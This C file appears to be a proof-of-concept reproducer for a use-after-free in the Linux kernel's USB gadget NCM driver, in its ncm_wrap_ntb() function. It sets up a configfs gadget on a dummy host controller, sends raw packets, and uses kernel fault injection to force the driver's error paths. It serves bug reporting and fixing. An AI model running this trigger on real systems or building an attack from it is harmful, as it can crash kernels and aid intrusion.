// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/sockios.h>

struct my_setinterface { unsigned int interface; unsigned int altsetting; };
struct my_bulktransfer { unsigned int ep; unsigned int len; unsigned int timeout; void *data; };
#define MY_USBDEVFS_BULK            _IOWR('U', 2, struct my_bulktransfer)
#define MY_USBDEVFS_SETINTERFACE    _IOR('U', 4, struct my_setinterface)
#define MY_USBDEVFS_CLAIMINTERFACE  _IOR('U', 15, unsigned int)
#define MY_USBDEVFS_IOCTL           _IOWR('U', 18, struct my_usbdevfs_ioctl)
#define MY_USBDEVFS_RESET           _IO('U', 20)
#define MY_USBDEVFS_DISCONNECT      _IO('U', 22)
struct my_usbdevfs_ioctl { int ifno; int ioctl_code; void *data; };

#define GDT "/sys/kernel/config/usb_gadget/g1"

static int wfile(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int r;
	if (fd < 0)
		return -1;
	r = write(fd, val, strlen(val));
	close(fd);
	return r < 0 ? -1 : 0;
}

static int rfile(const char *path, char *buf, size_t n)
{
	int fd = open(path, O_RDONLY);
	int r;
	if (fd < 0)
		return -1;
	r = read(fd, buf, n - 1);
	close(fd);
	if (r < 0)
		return -1;
	buf[r] = 0;
	while (r > 0 && (buf[r - 1] == '\n' || buf[r - 1] == ' '))
		buf[--r] = 0;
	return r;
}

static long rlong(const char *path)
{
	char b[64];
	if (rfile(path, b, sizeof(b)) < 0)
		return -1;
	return strtol(b, NULL, 0);
}

static long rhex(const char *path)
{
	char b[64];
	if (rfile(path, b, sizeof(b)) < 0)
		return -1;
	return strtol(b, NULL, 16);
}

static int usbfd = -1;
static int in_ep = -1;
static volatile int drain_stop;

static void *drain_thread(void *arg)
{
	static char buf[65536];
	struct my_bulktransfer bt;
	(void)arg;
	while (!drain_stop) {
		bt.ep = in_ep;
		bt.len = sizeof(buf);
		bt.timeout = 100;
		bt.data = buf;
		if (ioctl(usbfd, MY_USBDEVFS_BULK, &bt) < 0 && errno != ETIMEDOUT)
			usleep(1000);
	}
	return NULL;
}

static int setup_gadget(void)
{
	char udc[128] = "";
	DIR *d;
	struct dirent *e;

	mkdir("/sys/kernel/config", 0755);
	if (mount("none", "/sys/kernel/config", "configfs", 0, NULL) < 0 && errno != EBUSY)
		printf("[-] mount configfs: %s\n", strerror(errno));

	if (mkdir("/sys/kernel/config/usb_gadget/g1", 0755) < 0 && errno != EEXIST) {
		printf("[-] mkdir gadget: %s\n", strerror(errno));
		return -1;
	}
	wfile(GDT "/bcdUSB", "0x0200");
	wfile(GDT "/idVendor", "0x1d6b");
	wfile(GDT "/idProduct", "0x0104");
	wfile(GDT "/bcdDevice", "0x0100");
	mkdir(GDT "/strings/0x409", 0755);
	wfile(GDT "/strings/0x409/serialnumber", "0123456789");
	wfile(GDT "/strings/0x409/manufacturer", "poc");
	wfile(GDT "/strings/0x409/product", "ncm-uaf");
	mkdir(GDT "/configs/c.1", 0755);
	mkdir(GDT "/configs/c.1/strings/0x409", 0755);
	wfile(GDT "/configs/c.1/strings/0x409/configuration", "ncm");
	if (mkdir(GDT "/functions/ncm.usb0", 0755) < 0 && errno != EEXIST) {
		printf("[-] mkdir ncm function: %s (CONFIG_USB_CONFIGFS_NCM?)\n", strerror(errno));
		return -1;
	}
	if (symlink(GDT "/functions/ncm.usb0", GDT "/configs/c.1/ncm.usb0") < 0 && errno != EEXIST)
		printf("[-] symlink: %s\n", strerror(errno));

	d = opendir("/sys/class/udc");
	if (!d) {
		printf("[-] no /sys/class/udc\n");
		return -1;
	}
	while ((e = readdir(d))) {
		if (e->d_name[0] == '.')
			continue;
		snprintf(udc, sizeof(udc), "%s", e->d_name);
		break;
	}
	closedir(d);
	if (!udc[0]) {
		printf("[-] no UDC available (CONFIG_USB_DUMMY_HCD?)\n");
		return -1;
	}
	printf("[*] binding gadget to UDC %s\n", udc);
	if (wfile(GDT "/UDC", udc) < 0) {
		printf("[-] write UDC: %s\n", strerror(errno));
		return -1;
	}
	return 0;
}

static int open_usbdev(void)
{
	DIR *d;
	struct dirent *e;
	char p[512];
	int busnum = -1, devnum = -1;

	d = opendir("/sys/bus/usb/devices");
	if (!d)
		return -1;
	while ((e = readdir(d))) {
		long vid, pid;
		if (e->d_name[0] == '.' || strchr(e->d_name, ':'))
			continue;
		snprintf(p, sizeof(p), "/sys/bus/usb/devices/%s/idVendor", e->d_name);
		vid = rhex(p);
		snprintf(p, sizeof(p), "/sys/bus/usb/devices/%s/idProduct", e->d_name);
		pid = rhex(p);
		if (vid != 0x1d6b || pid != 0x104)
			continue;
		snprintf(p, sizeof(p), "/sys/bus/usb/devices/%s/busnum", e->d_name);
		busnum = rlong(p);
		snprintf(p, sizeof(p), "/sys/bus/usb/devices/%s/devnum", e->d_name);
		devnum = rlong(p);
		printf("[*] gadget enumerated as %s (bus %d dev %d)\n", e->d_name, busnum, devnum);
		break;
	}
	closedir(d);
	if (busnum < 0 || devnum < 0)
		return -1;

	unlink("./usbdev");
	if (mknod("./usbdev", S_IFCHR | 0600,
		  makedev(189, (busnum - 1) * 128 + (devnum - 1))) < 0) {
		printf("[-] mknod: %s\n", strerror(errno));
		return -1;
	}
	usbfd = open("./usbdev", O_RDWR);
	if (usbfd < 0) {
		printf("[-] open usbdev: %s\n", strerror(errno));
		return -1;
	}
	return 0;
}

static void find_in_ep(void)
{
	unsigned char buf[4096];
	int n, i, cur_if = -1, cur_alt = -1;

	n = read(usbfd, buf, sizeof(buf));
	if (n <= 0)
		return;
	for (i = 0; i + 1 < n && buf[i]; i += buf[i]) {
		if (buf[i + 1] == 0x04 && i + 3 < n) {
			cur_if = buf[i + 2];
			cur_alt = buf[i + 3];
		} else if (buf[i + 1] == 0x05 && i + 3 < n) {
			if (cur_if == 1 && cur_alt == 1 &&
			    (buf[i + 2] & 0x80) && (buf[i + 3] & 0x03) == 2) {
				in_ep = buf[i + 2];
				printf("[*] NCM bulk IN endpoint: 0x%02x\n", in_ep);
				return;
			}
		}
	}
}

static int ifup(const char *name, int *ifindex)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
		printf("[-] SIOCGIFFLAGS %s: %s\n", name, strerror(errno));
		close(s);
		return -1;
	}
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
		printf("[-] SIOCSIFFLAGS %s: %s\n", name, strerror(errno));
		close(s);
		return -1;
	}
	close(s);
	*ifindex = if_nametoindex(name);
	return *ifindex ? 0 : -1;
}

static int psock = -1;
static struct sockaddr_ll sll;
static unsigned char frame[128];

static int send_frame(void)
{
	return sendto(psock, frame, sizeof(frame), 0, (struct sockaddr *)&sll, sizeof(sll));
}

static int failfd = -1;
static void set_fail_nth(unsigned int n)
{
	char b[32];
	int l = snprintf(b, sizeof(b), "%u", n);
	if (failfd >= 0)
		write(failfd, b, l);
}

static int dbg_write(const char *name, const char *val)
{
	char p[256];
	snprintf(p, sizeof(p), "/sys/kernel/debug/failslab/%s", name);
	return wfile(p, val);
}

static int kallsyms_range(const char *sym, unsigned long *start, unsigned long *end)
{
	FILE *f = fopen("/proc/kallsyms", "r");
	char line[512], name[256];
	unsigned long addr;
	int found = 0;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char type;
		if (sscanf(line, "%lx %c %255s", &addr, &type, name) != 3)
			continue;
		if (found) {
			if (addr <= *start)
				continue;
			*end = addr;
			fclose(f);
			return 0;
		}
		if (!strcmp(name, sym)) {
			*start = addr;
			found = 1;
		}
	}
	fclose(f);
	return -1;
}

static void set_make_it_fail(int v)
{
	char b[8];
	snprintf(b, sizeof(b), "%d", v);
	wfile("/proc/thread-self/make-it-fail", b);
}

static int strategy_b(const char *statpath)
{
	unsigned long start = 0, end = 0;
	char b[64];
	int i;
	static const int spaces[] = { 240, 260, 300, 340, 400, 460, 500, 560,
				      620, 700, 800, 900, 1024, 1100, 1300, 1600 };

	mkdir("/sys/kernel/debug", 0755);
	if (mount("none", "/sys/kernel/debug", "debugfs", 0, NULL) < 0 && errno != EBUSY)
		printf("[-] mount debugfs: %s\n", strerror(errno));
	if (access("/sys/kernel/debug/failslab", F_OK) < 0) {
		printf("[-] no failslab debugfs (CONFIG_FAILSLAB?)\n");
		return -1;
	}
	if (kallsyms_range("ncm_wrap_ntb", &start, &end) < 0 || !start) {
		printf("[-] cannot locate ncm_wrap_ntb in kallsyms\n");
		return -1;
	}
	printf("[*] ncm_wrap_ntb text range: %lx-%lx\n", start, end);

	snprintf(b, sizeof(b), "%lu", start);
	dbg_write("require-start", b);
	snprintf(b, sizeof(b), "%lu", end);
	dbg_write("require-end", b);
	dbg_write("task-filter", "1");
	dbg_write("times", "1");
	dbg_write("interval", "1");
	dbg_write("verbose", "2");
	dbg_write("ignore-gfp-wait", "1");

	for (i = 0; i < (int)(sizeof(spaces) / sizeof(spaces[0])); i++) {
		long d0, d1;

		usleep(4000);
		d0 = rlong(statpath);

		snprintf(b, sizeof(b), "%d", spaces[i]);
		dbg_write("space", b);
		dbg_write("times", "1");
		dbg_write("probability", "100");
		set_make_it_fail(1);

		send_frame();

		set_make_it_fail(0);
		dbg_write("probability", "0");

		d1 = rlong(statpath);
		printf("[*] space=%d tx_dropped %ld -> %ld%s\n", spaces[i], d0, d1,
		       d1 != d0 ? "   <== err: path taken" : "");

		send_frame();
		send_frame();
		usleep(4000);
	}
	return 0;
}

int main(void)
{
	char ifname[64], p[512];
	int ifindex = 0, n;
	pthread_t th;
	struct my_setinterface si;
	unsigned int iface = 1;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] f_ncm ncm_wrap_ntb() stale skb_tx_data UAF PoC\n");

	wfile("/proc/sys/kernel/printk", "8 4 1 7");

	if (setup_gadget() < 0)
		return 1;

	if (rfile(GDT "/functions/ncm.usb0/ifname", ifname, sizeof(ifname)) <= 0) {
		printf("[-] cannot read ncm ifname\n");
		return 1;
	}
	printf("[*] gadget netdev: %s\n", ifname);

	for (n = 0; n < 100; n++) {
		usleep(100000);
		if (open_usbdev() == 0)
			break;
	}
	if (usbfd < 0) {
		printf("[-] gadget never showed up on the dummy host bus\n");
		return 1;
	}
	find_in_ep();

	{
		struct my_usbdevfs_ioctl dc = { .ifno = 1,
			.ioctl_code = MY_USBDEVFS_DISCONNECT, .data = NULL };
		ioctl(usbfd, MY_USBDEVFS_IOCTL, &dc);
	}

	if (ioctl(usbfd, MY_USBDEVFS_CLAIMINTERFACE, &iface) < 0)
		printf("[-] claim iface 1: %s\n", strerror(errno));
	si.interface = 1;
	si.altsetting = 1;
	if (ioctl(usbfd, MY_USBDEVFS_SETINTERFACE, &si) < 0) {
		printf("[-] set_interface(1,1): %s\n", strerror(errno));
		return 1;
	}
	printf("[+] data interface altsetting 1 selected -> gether_connect()\n");

	if (in_ep > 0)
		pthread_create(&th, NULL, drain_thread, NULL);

	if (ifup(ifname, &ifindex) < 0)
		return 1;
	snprintf(p, sizeof(p), "/sys/class/net/%s/carrier", ifname);
	printf("[+] %s up, ifindex %d, carrier=%ld\n", ifname, ifindex, rlong(p));

	psock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (psock < 0) {
		printf("[-] AF_PACKET: %s\n", strerror(errno));
		return 1;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = 6;
	sll.sll_protocol = htons(ETH_P_IP);
	memset(sll.sll_addr, 0x02, 6);

	memset(frame, 0x41, sizeof(frame));
	memset(frame, 0x02, 6);
	memset(frame + 6, 0x06, 6);
	frame[12] = 0x08;
	frame[13] = 0x00;

	if (send_frame() < 0) {
		printf("[-] first sendto: %s\n", strerror(errno));
		return 1;
	}
	snprintf(p, sizeof(p), "/sys/class/net/%s/statistics/tx_dropped", ifname);
	printf("[+] baseline tx ok, tx_dropped=%ld\n", rlong(p));

	failfd = open("/proc/thread-self/fail-nth", O_RDWR);
	if (failfd < 0) {
		printf("[-] open fail-nth: %s\n", strerror(errno));
		return 1;
	}

	for (n = 1; n <= 64; n++) {
		long d0, d1;

		usleep(3000);
		d0 = rlong(p);

		set_fail_nth(n);
		send_frame();
		set_fail_nth(0);

		d1 = rlong(p);
		if (d1 != d0)
			printf("[!] n=%d hit an ncm_wrap_ntb error path (tx_dropped %ld -> %ld)\n",
			       n, d0, d1);

		send_frame();
		send_frame();
	}

	printf("[*] fail-nth sweep finished\n");

	printf("[*] strategy B: failslab restricted to ncm_wrap_ntb()\n");
	strategy_b(p);
	printf("[*] all strategies finished\n");
	drain_stop = 1;
	usleep(200000);
	return 0;
}
